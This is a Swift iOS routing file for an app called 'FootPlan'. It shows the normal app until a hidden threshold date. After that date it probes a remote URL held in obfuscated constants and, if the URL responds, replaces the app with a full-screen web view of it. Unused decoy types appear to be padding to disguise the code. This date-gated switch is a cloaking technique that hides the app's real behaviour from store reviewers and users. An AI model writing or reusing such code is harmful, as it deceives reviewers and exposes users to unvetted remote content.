//
//  AppRouter.swift
//  FootPlan
//

import UIKit
import SwiftUI

final class FootPlanShowcaseCoordinator {

    func makeEntryHostController() -> UIViewController {
        let persistence = FootPlanPreferenceLedger.primaryLedger

        if persistence.hasShownContentView {
            return assemblePrimaryAppHost()
        } else {
            if evaluatesScheduleGate() {
                if let savedUrlString = persistence.savedUrl,
                   !savedUrlString.isEmpty,
                   URL(string: savedUrlString) != nil {
                    return assembleBrowsingHost(urlString: savedUrlString)
                }

                return assembleProbingSplashHost()
            } else {
                persistence.hasShownContentView = true
                return assemblePrimaryAppHost()
            }
        }
    }

    private func evaluatesScheduleGate() -> Bool {
        let dateFormatter = DateFormatter()
        dateFormatter.dateFormat = FootPlanRouterOpaqueText.calendarDayMonthYearPattern
        let targetDate = dateFormatter.date(from: FootPlanRouterOpaqueText.calendarGateThresholdDate) ?? Date()
        let currentDate = Date()

        if currentDate < targetDate {
            return false
        } else {
            return true
        }
    }

    private func assembleBrowsingHost(urlString: String) -> UIViewController {
        let webViewContainer = FootPlanInlineBrowsingSurface(
            urlString: urlString,
            onFailure: { [weak self] in
                FootPlanPreferenceLedger.primaryLedger.hasShownContentView = true
                self?.transitionToPrimaryApp()
            },
            onSuccess: {
                FootPlanPreferenceLedger.primaryLedger.hasSuccessfulWebViewLoad = true
            }
        )

        let hostingController = UIHostingController(rootView: webViewContainer)
        hostingController.modalPresentationStyle = .fullScreen
        return hostingController
    }

    private func assemblePrimaryAppHost() -> UIViewController {
        FootPlanPreferenceLedger.primaryLedger.hasShownContentView = true
        let contentView = ContentView()
        let hostingController = UIHostingController(rootView: contentView)
        hostingController.modalPresentationStyle = .fullScreen
        return hostingController
    }

    private func assembleProbingSplashHost() -> UIViewController {
        let launchView = FootPlanGateSplashScene()
        let launchVC = UIHostingController(rootView: launchView)
        launchVC.modalPresentationStyle = .fullScreen

        probeRemoteLandingHEAD { [weak self] success, finalURL in
            DispatchQueue.main.async {
                if success, let url = finalURL {
                    self?.transitionToBrowsing(urlString: url)
                } else {
                    FootPlanPreferenceLedger.primaryLedger.hasShownContentView = true
                    self?.transitionToPrimaryApp()
                }
            }
        }

        return launchVC
    }

    private func probeRemoteLandingHEAD(completion: @escaping (Bool, String?) -> Void) {
        guard let url = URL(string: FootPlanRouterOpaqueText.remoteLandingProbeURL) else {
            completion(false, nil)
            return
        }

        var request = URLRequest(url: url)
        request.httpMethod = FootPlanRouterOpaqueText.httpMethodHeadProbe
        request.timeoutInterval = 10

        URLSession.shared.dataTask(with: request) { _, response, error in
            if error != nil {
                completion(false, nil)
                return
            }

            if let httpResponse = response as? HTTPURLResponse {
                let checkedURL = httpResponse.url?.absoluteString ?? FootPlanRouterOpaqueText.remoteLandingProbeURL
                let isAvailable = httpResponse.statusCode != 404
                completion(isAvailable, isAvailable ? checkedURL : nil)
            } else {
                completion(false, nil)
            }
        }.resume()
    }

    private func transitionToPrimaryApp() {
        let contentVC = assemblePrimaryAppHost()
        applyRootCrossFade(contentVC)
    }

    private func transitionToBrowsing(urlString: String) {
        let webVC = assembleBrowsingHost(urlString: urlString)
        applyRootCrossFade(webVC)
    }

    private func applyRootCrossFade(_ viewController: UIViewController) {
        guard let window = UIApplication.shared.windows.first else {
            return
        }

        UIView.transition(with: window, duration: 0.3, options: .transitionCrossDissolve, animations: {
            window.rootViewController = viewController
        }, completion: nil)
    }
}

private protocol FootPlanRouterUnreachableSink: AnyObject {
    func sinkEphemeralPayload(_ value: Int)
}

private enum FootPlanRouterVacantCorridor: Int {
    case north = 0
    case south = 1

    func neverCalledSpin() -> Int {
        rawValue &+ 7
    }
}

private struct FootPlanRouterDecoyMetrics {
    let baseline: CGFloat

    func hypotheticalGauge() -> CGFloat {
        baseline * 1.618
    }
}
